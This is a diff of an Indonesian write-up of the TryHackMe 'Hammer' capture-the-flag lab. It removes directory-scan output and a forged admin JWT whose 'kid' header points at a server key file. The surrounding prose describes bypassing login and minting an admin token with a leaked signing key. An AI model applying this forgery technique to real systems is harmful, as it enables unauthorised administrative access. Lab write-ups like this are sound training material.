@@ -50,49 +50,7 @@ Kami menemukan beberapa halaman dan direktori. Di antara mereka PhpMyAdmin. Jadi
 ┌──(0xb0b㉿kali)-[~/Documents/tryhackme/hammer]
 └─$ feroxbuster -u 'http://hammer.thm:1337' -w /usr/share/wordlists/dirb/big.txt
                                                                                                                       
- ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
-|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher 🤓                 ver: 2.10.2
-───────────────────────────┬──────────────────────
- 🎯  Target Url            │ http://hammer.thm:1337
- 🚀  Threads               │ 50
- 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
- 👌  Status Codes          │ All Status Codes!
- 💥  Timeout (secs)        │ 7
- 🦡  User-Agent            │ feroxbuster/2.10.2
- 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
- 🔎  Extract Links         │ true
- 🏁  HTTP methods          │ [GET]
- 🔃  Recursion Depth       │ 4
- 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
-───────────────────────────┴──────────────────────
- 🏁  Press [ENTER] to use the Scan Management Menu™
-──────────────────────────────────────────────────
-404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET       47l      111w     1664c http://hammer.thm:1337/reset_password.php
-200      GET        6l     2304w   232914c http://hammer.thm:1337/hmr_css/bootstrap.min.css
-200      GET       36l       83w     1326c http://hammer.thm:1337/
-301      GET        9l       28w      320c http://hammer.thm:1337/javascript => http://hammer.thm:1337/javascript/
-301      GET        9l       28w      320c http://hammer.thm:1337/phpmyadmin => http://hammer.thm:1337/phpmyadmin/
-301      GET        9l       28w      316c http://hammer.thm:1337/vendor => http://hammer.thm:1337/vendor/
-200      GET        0l        0w        0c http://hammer.thm:1337/vendor/autoload.php
-200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/ClassLoader.php
-200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_real.php
-200      GET       63l      136w     2071c http://hammer.thm:1337/vendor/composer/installed.json
-200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_namespaces.php
-200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_static.php
-200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_psr4.php
-200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_classmap.php
-200      GET       19l      168w     1068c http://hammer.thm:1337/vendor/composer/LICENSE
-200      GET       30l      224w     1529c http://hammer.thm:1337/vendor/firebase/php-jwt/LICENSE
-200      GET       42l      100w     1173c http://hammer.thm:1337/vendor/firebase/php-jwt/composer.json
-200      GET      170l      650w     8697c http://hammer.thm:1337/vendor/firebase/php-jwt/CHANGELOG.md
-200      GET      424l     1529w    13516c http://hammer.thm:1337/vendor/firebase/php-jwt/README.md
-301      GET        9l       28w      327c http://hammer.thm:1337/javascript/jquery => http://hammer.thm:1337/javascript/jquery/
-301      GET        9l       28w      324c http://hammer.thm:1337/phpmyadmin/doc => http://hammer.thm:1337/phpmyadmin/doc/
-200      GET       98l      278w    35231c http://hammer.thm:1337/phpmyadmin/favicon.ico
+
 
 Mengunjungi halaman indeks dengan pencacahan manual membawa kita langsung ke halaman login. 
 ![Halaman web login hammer thm](halamanwebloginhammer%20thm.png)
@@ -112,45 +70,6 @@ Kami sekarang menemukan direktori hmr_logs, yang memiliki daftar direktori diakt
 ┌──(0xb0b㉿kali)-[~/Documents/tryhackme/hammer]
 └─$ feroxbuster -u 'http://hammer.thm:1337' -w hmr_big.txt
                                                                                                                       
- ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
-|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher 🤓                 ver: 2.10.2
-───────────────────────────┬──────────────────────
- 🎯  Target Url            │ http://hammer.thm:1337
- 🚀  Threads               │ 50
- 📖  Wordlist              │ hmr_big.txt
- 👌  Status Codes          │ All Status Codes!
- 💥  Timeout (secs)        │ 7
- 🦡  User-Agent            │ feroxbuster/2.10.2
- 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
- 🔎  Extract Links         │ true
- 🏁  HTTP methods          │ [GET]
- 🔃  Recursion Depth       │ 4
- 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
-───────────────────────────┴──────────────────────
- 🏁  Press [ENTER] to use the Scan Management Menu™
-──────────────────────────────────────────────────
-403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET       47l      111w     1664c http://hammer.thm:1337/reset_password.php
-200      GET        6l     2304w   232914c http://hammer.thm:1337/hmr_css/bootstrap.min.css
-200      GET       36l       83w     1326c http://hammer.thm:1337/
-301      GET        9l       28w      317c http://hammer.thm:1337/hmr_css => http://hammer.thm:1337/hmr_css/
-301      GET        9l       28w      320c http://hammer.thm:1337/hmr_images => http://hammer.thm:1337/hmr_images/
-200      GET     1676l     9897w   792599c http://hammer.thm:1337/hmr_images/hammer.webp
-301      GET        9l       28w      316c http://hammer.thm:1337/hmr_js => http://hammer.thm:1337/hmr_js/
-200      GET        2l     1294w    89501c http://hammer.thm:1337/hmr_js/jquery-3.6.0.min.js
-301      GET        9l       28w      318c http://hammer.thm:1337/hmr_logs => http://hammer.thm:1337/hmr_logs/
-200      GET        9l      219w     1984c http://hammer.thm:1337/hmr_logs/error.logs
-[####################] - 25s    20480/20480   0s      found:10      errors:0      
-[####################] - 24s    20469/20469   844/s   http://hammer.thm:1337/ 
-[####################] - 0s     20469/20469   193104/s http://hammer.thm:1337/hmr_css/ => Directory listing
-[####################] - 1s     20469/20469   34172/s http://hammer.thm:1337/hmr_images/ => Directory listing
-[####################] - 0s     20469/20469   84583/s http://hammer.thm:1337/hmr_js/ => Directory listing
-[####################] - 0s     20469/20469   208867/s http://hammer.thm:1337/hmr_logs/ => Directory listing
-```
-
 ---
 
 ## 3. Melewati Login
@@ -312,30 +231,6 @@ Kami menganalisis token JWT menggunakan  jwt.iodan dapat membuat struktur, di he
 ![Jwtio1](jwtio1%20.png)
 
 Kami ingat daftar kami  lsperintah, di sini kita punya file kunci. File kunci berisi nilai hash. Mungkin rahasia untuk menandatangani token JWT. Jadi kita mungkin bisa membuat token kita sendiri, karena kita memiliki akses ke rahasia dan dapat menebak lokasi token untuk anak itu.
-
-Mari kita buat token admin dengan struktur seperti ini:
-
-{
-  "alg": "HS256",
-  "kid": "/var/www/html/188ade1.key",
-  "typ": "JWT"
-}
-{
-  "iss": "http://hammer.thm",
-  "aud": "http://hammer.thm",
-  "iat": 1725193591,
-  "exp": 1725199591,
-  "data": {
-    "user_id": 1,
-    "email": "tester@hammer.thm",
-    "role": "admin"
-  }
-}
-HMACSHA256(
-  base64UrlEncode(header) + "." +
-  base64UrlEncode(payload),
-  
-)
 
 Kami menggunakan skrip python untuk membuat token dengan peran admin, kami memasukkan saluran konten  4dan jalan dari garis rahasia 10. Kami juga menetapkan tanggal kedaluwarsa sedikit lebih tinggi untuk kami.
 
